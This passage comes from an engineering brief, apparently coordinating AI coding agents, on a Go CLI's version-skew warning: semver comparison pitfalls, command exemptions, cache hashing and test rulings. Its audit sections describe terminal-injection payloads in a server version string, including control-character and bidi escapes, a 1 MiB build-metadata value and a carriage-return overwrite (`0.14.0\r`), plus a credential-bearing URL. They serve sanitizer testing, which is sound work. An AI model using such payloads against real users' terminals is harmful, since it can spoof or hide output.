here hits it."* Issue #144 is the first instance to hit it, and it did: the lead's own
§4 inherited the error from this sentence.

**The repo already held the correction and only CLAUDE.md was left behind.** Both landed
2026-07-28: `api/cmd/server/main.go:57-63` (commit `b81d1ede`, titled *"fix the
bare-version line"*) and `specs/ai.md` §450. `main.go` names CLAUDE.md's sentence, states
the counter-example six lines away, and stops short of concluding the sentence is wrong.
**Neither file needs changing — both are already right.**

### Scope, exactly two edits — do NOT widen

**(1) `CLAUDE.md:166`** — replace ONLY the headline, the support sentence, and the
measured block. **Keep everything from *"The trap that makes this survive review"* onward
verbatim** — the `v0.11.7.1` invalid-sorts-below tooth, the `+g<sha>` build-metadata
tooth, and the `forgejo.go` precedent were all re-derived clean and are correct.

Replacement (fact-checker's wording, lead-verified; adapt only if you find an error):

> **COMPARING VERSIONS? `golang.org/x/mod/semver` NEEDS A LEADING `v`, AND THIS PROJECT
> SHIPS BOTH SHAPES — the naive compare fails SILENTLY and fails OPEN.** Not PRD-specific;
> any future version comparison here hits it. **The server side is BARE and the CLI side
> carries the `v`, deliberately on both counts:** `api/Dockerfile:41` stamps
> `-X main.version=${UZI_VERSION#v}` and `deploy/chart/Chart.yaml:10-11` carries
> `version`/`appVersion` without the `v` (Model B: served value == image tag == chart
> appVersion), while `Formula/uzi-cli.rb:48` stamps `-X main.version=v#{version}` and
> `scripts/brew-local-test.sh:73` **gates the release on that `v` being present**.
> `api/cmd/server/main.go:51-63` states the split at the source: do not "fix" one side to
> match the other. Git tags are `v`-prefixed too; the controller binary is stamped with no
> version at all.

Then a dated correction note carrying: the universal was FALSE and nine days old when
written; the two SHAs above; that it was migrated from PRD #113 where it was true at that
scope; that the support sentence named 2 of 17 sites while the headline quantified over
all; the live measurement (`uzi version` → `v0.14.0` vs `/api/version` → `0.14.0`, same
host, same release, one minute apart); and that `main.go` + `specs/ai.md` §450 already had
it right on 2026-07-28.

Then replace the measured block with the three rows that matter, **the mixed pair being
the dangerous one**:

```
Compare("0.11.0",  "0.11.7")  =  0   IsValid false/false   <- both bare: two releases read EQUAL
Compare("v0.11.8", "0.14.0")  = +1   IsValid true/false    <- THE LIVE CLI->SERVER PAIR: reads "AHEAD"
Compare("v0.11.8", "v0.14.0") = -1   IsValid true/true     <- what a fixture "naturally" writes
```

plus the inertness result: **0 of 25 rows over a grid of every shipped shape would warn,
including `v0.1.0` against `99.0.0`.** Not "wrong on some pairs" — inert across the whole
input space. Normalise BOTH sides and `IsValid`-guard BOTH.

**(2) `CLAUDE.md:500`** — cites `.gitignore:44` **twice**; line 44 is `__pycache__/` and
the live line is **52** (`.claude/agent-team-tasks/`). Lead verified both. Same staleness
class as (1), in the same file.

### Do NOT change

`specs/ai.md` §450 and `api/cmd/server/main.go` — already correct. `agent/package.json`'s
`"0.1.0-m4"` (inert, flagged only as a note). `controller/Dockerfile`'s missing stamp
(not a defect; nothing compares it).

---

## 11. AMENDMENT 6 — architect revision 2. ADDITIVE. Nothing in flight is invalidated.

The architect self-corrected twice against the auditor's measurements and found one thing
neither the auditor nor the lead had. **This is a design change under §9's freeze rule, so
it is stated as one** — but it is purely additive: the exemption list gains entries and
the test spec gains a row. Nothing already built needs undoing.

### 6a — 🔴 A THIRD EXEMPT COMMAND, AND THE RULE THAT FINDS IT

Amendment 4 bound `logout` + `auth token` from the auditor's report. **`uzi auth status`
has exactly the same property and nobody had named it.** Lead verified at
`auth.go:63-85`: `resolveSettings` + print, **no client**.

**Replace the enumerated list with the RULE** — a list stated as "the two the auditor
found" misses the third by construction:

> **Exempt every command that makes no network call of its own.**

**🔴 AND THE OBVIOUS INSTRUMENT FOR THAT RULE IS WRONG. Measured by the lead:**

```
git grep -F 'env.client('     -- api/cmd/uzi   ->  34 sites
git grep -F 'env.NewClient('  -- api/cmd/uzi   ->   2 sites, one of them login.go:53
```

**`uzi login` builds its client directly** (`login.go:53` `c := env.NewClient(s)`), so a
grep for `env.client(` alone reports login as local-only and **would exempt it for the
wrong reason while looking correct**. The architect flagged this; the lead re-derived the
second grep. `login` is NOT exempt.

**And a file-level grep is insufficient in the other direction too:** `auth.go` appears in
the `env.client(` list, yet `auth status` and `auth token` — both in that file — make no
call. **Resolve the rule per-RunE, not per-file.** Two greps, then read each command body.

### 6b — THE VALIDITY GUARD STOPS H1 AND DOES NOT STOP H2

The architect ran the auditor's four attack strings through
`semver.IsValid(normSemver(v))`: **all four are rejected — and the tempting inference from
that is still wrong.** SemVer build metadata is `[0-9A-Za-z-]` with **no length limit**, so
`0.14.0+` followed by 1 MiB of `A` is **valid semver** and reaches the message.

So: the validity guard stops the four control/bidi payloads on the *warning* path, does
**not** stop the size payload, and does so **only because rule 2 happens to precede the
interpolation** — a statement-ordering property a refactor loses silently.
**`cellText` stays unconditional on both sinks.** The pre-existing `serverRows` sink has
**no validity guard at all**, so all four land there; nothing in §7 H1 softens.

**🔴 TEST CONSEQUENCE — do not get this backwards.** With `cellText` removed:
- at the **warning** path, **only the 1 MiB row should redden**;
- at the **`serverRows`** path, **all four should redden**.

If all four redden at the warning path, the guard order is not what the design specifies.

### 6c — `cli_version` in the cache is FORENSICS ONLY, never keyed on

This resolves a latent conflict rather than adding scope. §7's ungraded note proposed
including the CLI's own version and invalidating when it changes. **That is the right fix
for a VERDICT cache and is redundant under §9's OBSERVATION cache** — recomputing against
`version` each run already self-heals on upgrade, instantly and with no TTL wait.

Mirror `skillState` (`skill.go:74-79`) verbatim, which decided this exact question with its
reason in its own comment: *"Staleness keys on the hash …, NOT on cli_version … cli_version
is retained for human forensics."*

### 6d — TTL 1h stands, and H5's grade does NOT move

The architect rebuilt the argument with two bounds. **H5's wording invites over-reading:
the EXISTENCE of the TTL is the mitigation, its VALUE is not.** For a 50-agent fleet:
no TTL ≈ 90,000 req/h; 1 min ≈ 3,000; **1 h ≈ 50**; 24 h ≈ 2. The three-orders-of-magnitude
drop is entirely between *no TTL* and *any TTL*; 1h→24h buys 24× against an already
negligible baseline and costs a 24× longer silence window.

**A SHORTER negative TTL is rejected.** A failed probe costs the full 2s where a success
costs ~50ms, so shortening it maximises the cost of exactly the case it governs. **One TTL
value, both outcomes.**

### 6e — N7 is belt-and-braces, and know which

`e2e/run-e2e.sh:1665-1667` builds with **no `-ldflags`**, so the harness binary is `dev`
and short-circuits before probing. **Add the env var anyway** — that reason evaporates the
day someone stamps the e2e build.

### Already decided; the architect asked again because it had not seen Amendment 4

- **One line.** The preview's two-line form was a mockup wrap, not a spec.
- **`UZI_VERSION_CHECK=0` goes in BOTH `SKILL.md` and `docs/cli.md`.** The architect notes
  H1 cuts both ways here — `SKILL.md:43` telling agents to read stderr is what makes that
  channel worth protecting *and* worth explaining. Document it, framed as actionable.

---

## 12. AMENDMENT 7 — lead rulings on the coder's two questions. Implementation is at `ea71a367`.

### Ruling 1 — ACCEPTED. `144-design.md` §6's table is wrong in column `A`, rows 6 and 10.

The coder **re-derived all three broken reference implementations against
`x/mod@v0.38.0` rather than inheriting the table**, which is the behaviour this brief has
been asking for since Amendment 1. Its finding: `A` (*normalised + guarded, direction
dropped to `!= 0`*) is **silent** on row 6 (`dev`/`0.14.0`) and row 10
(`v0.11.7.1`/`0.14.0`) because the `IsValid` guards it carries reject both operands.
The design marks those rows `kills: G, A`; measured, they kill **G only**.

The coder also checked the alternative reading (`A` = G-plus-direction, no guards) and it
contradicts rows 7, 8 and 11 — so it is not what was meant.

**No binding moves and the vacuity floor holds:** each broken reference is still killed by
at least one row (N by 1/2/5/12/13, G by 6/10, A by 9). **`144-design.md` §6's `kills`
column for rows 6 and 10 should read `G`.** This is a docs fix on the design document, not
a design change. The shipped test table carries the measured flags, which is correct.

### Ruling 2 — HASH STANDS. §7 H4(b) governs; §9's phrasing was a summary, not a reversal.

The coder identified a genuine conflict I left unruled and resolved it the right way.

- **§7 H4(b)** (auditor): *"key on a hash of the URL, or the context name. Never the raw
  string"* — backed by **executed evidence**: `credentialSafeBase` does not strip userinfo,
  `--url 'http://alice:hunter2@…'` is served, and this cache is the **first** write path
  that would persist a `--url` base at all, into a **0644** file.
- **§9 point 2** (architect short form): *"keyed on a map of normalised base URL."*

§9 is later and §9 overrides where it touches the same thing — but the architect's design
**never engages with H4(b)**, and §9's only explicit conflict ruling is the
`logout`/`auth token` one. Silence is not reversal, especially against measured security
evidence. **The SHA-256 of the normalised URL satisfies both readings** and passes every
§7.2 row (URL A ≠ URL B; `https://x/` == `https://x`), pinned by
`TestVersionCacheDoesNotPersistTheURL` against the userinfo payload.

Accepted cost: the cache file is not human-readable. It is a cache, not configuration.

### Noted from the coder's report, not requiring a ruling

- **The discriminating sanitizer input is not the obvious one, and it was found by RUNNING
  the attacks.** Most payloads make the version string invalid semver, so `SkewWarning`
  goes silent and the payload never reaches stderr — meaning **a test built from
  `ESC[2J`/bidi passes against a completely unsanitized warning path.** What gets through
  is a payload whose *trimmed* form is valid semver: `normSemver` calls `TrimSpace`, and
  `\r`/`\n`/`\t` are `unicode.IsSpace`, so they are stripped for the **comparison** and
  survive into the **print**. **`0.14.0\r` is the live injection.** This is Amendment 6's
  §6b arriving one level deeper, and it is a stronger statement of it.
- The trailing-`\n` row needed a second assertion (stderr is exactly one line) to
  discriminate at all — `assertNoControlChars` skips `\n` as the line separator, so
  without it that row was **a pin, not evidence**.
- `_, _ = fmt.Fprint*` edits in `root.go`/`version.go` are pre-existing errcheck findings
  that `whole-files: true` made blocking once the branch touched those files. Expected
  ratchet adoption cost, not scope creep.
- First `task gate:api` run died on `Error: parallel golangci-lint is running` — a
  host-global lock held by a sibling worktree, not a failure. Re-ran green.

---

## 13. AMENDMENT 8 — §11 6b's TEST CONSEQUENCE IS REFUTED. Implementation at `f2f778d6`.

Refuted by the coder, re-derived independently by the lead against `x/mod@v0.38.0`.
**The binding is unaffected and strengthened; only the INSTRUMENT was wrong.**

### What 6b said, and why it is wrong

> *"With `cellText` removed — at the warning path, **only the 1 MiB row should redden**.
> If all four redden at the warning path, the guard order is not what the design
> specifies."*

**All five redden at the warning path. The guard order IS what the design specifies.**
The missing mechanism is `normSemver`'s `strings.TrimSpace`.

Measured, lead's run, on the literal payloads:

```
input                        IsValid   reaches the message?
erase display                false     no
line overwrite               false     no
osc8                         false     no
bidi                         false     no
1 MiB plain                  false     no
1 MiB BUILD METADATA         true      YES
trailing CR   "0.14.0\r"     true      YES
leading  CR   "\r0.14.0"     true      YES
trailing LF   "0.14.0\n"     true      YES
trailing TAB  "0.14.0\t"     true      YES
```

`\r`, `\n` and `\t` are `unicode.IsSpace`, so `TrimSpace` strips them **for the validity
check and the comparison** while `SkewWarning` interpolates the **verbatim** original.
**There is a whole second class the guard cannot see — larger than the size class, and it
contains the sharpest payload in the audit**: `0.14.0\r` erases uzi's own prefix mid-line.

**CORRECTED INSTRUMENT SIGNATURE**, replacing 6b's: with `cellText` removed, at the
**warning** path the four whitespace-edge rows **and** the build-metadata row redden
(5); at **`serverRows`**, all four auditor payloads redden. Coder's re-run: **10 of 10**.

**Anyone using 6b's stated signature as an instrument would read a correct implementation
as broken.** That is why this is recorded rather than quietly dropped — 6b was written
into the brief by the lead, and both the auditor and the tester were dispatched to test it.

### The sub-finding, where the LEAD was wrong and the coder was right

The 1 MiB build-metadata row produces **SILENCE**, not a truncated warning. `compactText`
(`run.go:1006-1014`) cuts at 200 and **appends `"…"`**; `…` is not in SemVer's
build-metadata charset `[0-9A-Za-z-]`, so the truncated string is invalid and the verdict
is silent. Safer than a truncated warning, but a **different assertion**: that row pins
`wantWarning: false` plus a byte count, and the mutation control turns it into a
one-megabyte line on stderr.

**The lead's first re-derivation contradicted the coder here and was wrong** — it modelled
the cap as a plain `s[:200]` slice with no ellipsis, which stays valid semver and would
print. Reading `compactText` settled it in one command. Recorded because the coder's own
first draft asserted *"warning printed AND bounded"* and went **red against correct
code** — the same wrong model, reached independently by two agents.

### Also landed in `f2f778d6`

- **6a** — `auth status` exempt. The set is **exhaustive, not enumerated**: counting
  `RunE:` against client constructions per file, every file matches except `auth.go`
  (3 RunE / 1 client), `login.go` (2/1), `skill.go` (4/0) — which accounts for every
  local-only command in the tree. **No fourth surprise.** `auth.go`'s single `env.client(`
  is at `:150` inside `newWhoamiCmd`, which is exactly §11 6a's "insufficient in the other
  direction" case. The switch matches the two `auth` leaves **by parent**, so a future
  network-bound `uzi auth <verb>` is not swept in and `uzi token list` / `uzi skill status`
  keep their status despite sharing leaf names.
- **6c** — `cli_version` recorded, never read back; freshness keys on `checked_at` alone.
  It had to become a **parameter** because `uzicli` has no access to the ldflags stamp —
  same reason `NewSkillInstaller` takes it.
- **6e** — the coder corrected a comment **its own first commit introduced**, which had
  claimed the skew hook would fire under the e2e harness. It would not: no `-ldflags`, so
  the binary is `dev` and short-circuits.

### Two process notes from the coder, both shapes this repo documents

- A greedy regex mangled `versioncheck_test.go` mid-edit; caught by the compiler, restored
  from HEAD, redone with anchored literal replacements.
- **Its first mutation run printed no test output at all** — `grep -c` returned 0, exited
  1, and short-circuited the `&&` chain before `go test` ran. *"Empty output read as a
  clean run for about ten seconds."* A control that produces no output is not a control.

---

## 14. AMENDMENT 9 — audit round. NO BLOCKING FINDINGS at `f2f778d6`.

Every round-1 finding (H1-H5) closed, each **verified by execution rather than by reading**,
in pristine `git archive` extracts. Harness: CLI built with
`-ldflags "-X main.version=v0.11.8"` — an unstamped build short-circuits and never probes —
driven at a hostile `/api/version`, every run carrying a `curl` positive control.

### The sharpest single piece of evidence on this branch

**The cache file on disk contains `"version":"0.14.0\r"` — the raw control character,
unsanitized.** That is the *positive proof* H4(c) is satisfied: a write-time stripper would
have removed it there and did not. Then, with the hostile server **shut down** (`pgrep`
control confirming it), the cache-read path prints 213 bytes, valid UTF-8, no control
bytes. **Raw `\r` on disk, clean bytes on the terminal, on a run that touched no network.**

Same measurement answers the `RecordServerVersion` 256-rune question: it is a storage bound
and is **not** being leaned on as a sanitizer — if it were, the `\r` could not be in the file.

Other closures worth recording: H1 — nine payloads at both sinks, **not one control byte or
bidi codepoint** at either, on any payload. H2 — the 1 MiB string yields **255 bytes** of
stdout, longest line 219 (round 1: 1048628 / 1048596). H4(b) — `grep -c hunter2` and
`grep -c 127.0.0.1` on the cache both **0**, before and after 6c added `cli_version`.

### 🔴 THE MOVING TREE CORRUPTED A RESULT, AND IT WAS NEARLY REPORTED

The auditor built a binary from the **shared worktree** after `git status` showed clean but
after the coder had begun editing. It measured `uzi auth status` → **0 probes** and was
about to record "correctly exempt". **It is not exempt at `ea71a367`** — it had unknowingly
built the coder's uncommitted fix. Static reading said *not exempt*, the binary said
*exempt*, and **only that contradiction exposed it**.

This is the lead's scheduling failure from §13's preamble arriving at a second agent.
Relayed to reviewer and tester as a claim to check. **Process fix the auditor asks for, and
it is right: give validators a frozen SHA that is not also the coder's live worktree.**

### Amendment 6b falsified a second time, independently — and the two counts DIFFER LEGITIMATELY

| SHA | mutation | rows reddening at the warning path |
|---|---|---|
| `ea71a367` | auditor's Mutation A | **4** (trailing CR, leading CR, trailing newline, trailing tab) |
| `f2f778d6` | coder's re-run | **5** (the four above + `unbounded_build_metadata`) |

**Both are correct for the SHA each was measured at** — `f2f778d6` adds that row to the
table. §13 recorded 5 citing the coder; this is not a discrepancy to reconcile and the two
numbers are kept side by side deliberately. At `serverRows` the auditor measured **5**, not
the 4 the prediction stated, so **6b undercounted at both sinks.**

### Two new findings, both real at `ea71a367`, both ALREADY FIXED at `f2f778d6`

- **MEDIUM — `uzi auth status` probed AND warned at `ea71a367`.** Measured matrix:
  `auth status probes=1 warned=1` against `auth token 0/0`, `logout 0/0`, `whoami 1/1`,
  `token list 1/1` (correct). `ea71a367` implemented the **enumerated list**, not the rule —
  precisely the trap §11 6a documented. **Plus a prose falsification in the same commit**:
  the doc comment read *"`logout` and `auth token` are **the two** commands that make NO
  network call today."* False; `auth status` is a third.
- **LOW — the length bound was unpinned at the warning sink at `ea71a367`.** Narrowest
  possible mutation (leave the control-stripper, change only `compactText`'s `max`) reddened
  only tests on *other* sinks. The risk was concrete, not theoretical: `SkewWarning`'s own
  doc invites the refactor (*"Sanitizing here as well would be free defence-in-depth"*), and
  anyone acting on it with a control-only stripper would have put 1 MiB on stderr with
  nothing failing.

**The auditor found both only because the tip moved.** Its own words: *"had I stopped at my
assigned scope I would have reported two open findings that were already closed."*

### Ungraded — two are actionable and route to the coder

1. **`version.go`'s comment overstates its own mechanism.** It says the `--json` path is safe
   because *"the structural encoder escapes what matters there"*. Measured: `encoding/json`
   escapes C0 and U+2028/29 but **not U+202E and not DEL**. **The decision is fine; narrow
   the sentence, not the behaviour.**
2. **`compactText` slices at 200 BYTES (`len(s)`), not runes, and can cut mid-rune.** Output
   stays valid UTF-8 only because `cellText`'s outer `strings.Map` re-encodes the orphan as
   U+FFFD — probed with 199 ASCII + `€€€€`: 257 bytes, valid UTF-8. **The safety is emergent
   from the ORDERING and nothing pins it.** A refactor swapping that order, or using
   `compactText` alone, emits invalid UTF-8 from attacker-chosen input.
3. Informational: the 1 MiB payload goes silent because `cellText` appends U+2026, illegal in
   build metadata. Fail-closed and correct, but anyone later making the truncation
   semver-safe silently inverts that test row's expectation.
4. Informational: the cache is 0644 holding a SHA-256 and a timestamp — strictly less than
   `config.toml` already exposes.

### Scan slot + gates

Slot is `none (gap, noted 2026-07-21)`; marker present, not re-raised. Tools of the
auditor's own choosing, labelled as such. **`govulncheck` exit 3 → 0 verified independently**
in a pristine extract — and the zero is discriminating rather than vacuous: it still reports
*1 vulnerability in a required module the code does not call*, which a silently no-op'd
scanner could not produce. `gitleaks` over the code commit: clean.

**The auditor deliberately did NOT run `task gate:api`**, correctly: the shared worktree held
another writer's staged changes for most of the audit, and `golangci-lint` takes a
host-global lock that would have risked killing the tester's run. It ran the package tests in
pristine extracts instead (`EXIT=0` at both `ea71a367` and `d96b6fe8`).

**One incidental result worth keeping:** its first extract was `api/`-only, and
`TestInstructionEvidenceIsWellFormed` **failed closed** — *"cannot read e2e/run-e2e.sh …
an unverifiable check must fail rather than pass quietly"* — catching the harness error. That
test is behaving exactly as designed, and it is a live instance of the
fixtures-across-the-module-boundary shape `CLAUDE.md` documents.
